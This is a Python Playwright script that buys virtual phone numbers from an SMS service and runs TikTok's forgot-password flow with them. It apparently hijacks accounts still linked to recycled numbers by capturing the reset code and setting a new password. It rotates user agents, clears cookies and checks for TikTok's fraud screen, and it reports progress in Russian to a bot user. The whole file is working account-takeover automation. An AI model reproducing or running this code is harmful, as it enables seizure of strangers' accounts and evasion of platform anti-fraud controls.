from playwright.async_api import async_playwright
from fake_useragent import UserAgent
from passwords import Generator
from config import *
from grizzly import Grizzly
from asyncio import sleep

passw = Generator()

async def main(event, tiktok: str, ccode: str) -> None | bool | tuple[bool, str, str, str] | int:
    try:
        arr = await Grizzly.buy(code=ccode, event=event)
        if arr is None:
            await event.respond("Не удалось получить номер")
            return None

        numberin, odr = arr[1], arr[0]
        ua = UserAgent()
        await event.respond(f"Начинаю проверку номера +{numberin}")
        if ccode == 54 or ccode == 4 or ccode == 43 or ccode == 16:
            number = numberin[1:]
        else:
            number = numberin[2:]
        print("sliced:", number)
        async with async_playwright() as p:
            browser = await p.chromium.launch(channel="chrome", headless=hds)
            context = await browser.new_context(user_agent=ua.random) #ua.chrome
            page = await context.new_page()
            print("cookies before:", await context.cookies())
            await context.clear_cookies()
            print("cookies after:", await context.cookies())
            await page.goto("https://www.tiktok.com/login/phone/forget-password")
            await page.wait_for_load_state('networkidle')

            await page.click('div[role="button"][aria-haspopup="true"]', timeout=60000)
            await page.click(f":text('{tiktok}')", timeout=60000)
            field = page.locator('input[name="mobile"]')

            if not field:
                raise Exception("Could not find mobile input field")
            await field.click()
            await field.fill(str(number))
            await page.click(":text('Send code')")
            await sleep(2)

            if page.url == "https://www.tiktok.com/login/download-app":
                print("FROD QR")
                return 0

            await sleep(wait1)
            num = await Grizzly.sms(odr)
            if not num:
                await sleep(wait2)
                num = await Grizzly.sms(odr)
                if not num:
                    await sleep(wait3)
                    num = await Grizzly.sms(odr)
            if not num:
                await event.respond(f"Не могу получить код активации, возвращаю средства за номер +{numberin}..")
                if await Grizzly.refund(odr):
                    await event.respond("Возврат успешен")
                else:
                    await event.respond("Возврат средств провалился")
                return False

            await event.respond("Код получен...")
            code = page.locator('input[type="text"][placeholder="Enter 6-digit code"]')
            if not code:
                raise Exception("Could not find code input field")

            await code.click()
            await code.fill(num)

            password = passw.get()
            pass_field = page.locator('input[type="password"][placeholder="Password"]')
            if not pass_field:
                raise Exception("Could not find password field")

            await pass_field.click()
            await pass_field.fill(password)
            await page.click(":text('Log in')")

            return True, numberin, odr, password

    except Exception as e:
        print(f"Error in main: {e}")
        if odr:
            await event.respond(f"Произошла ошибка, пытаюсь вернуть средства за +{numberin}...")
            if await Grizzly.refund(odr):
                await event.respond("Возврат средств успешен")
            else:
                await event.respond("Возврат средств не удался")
        return None
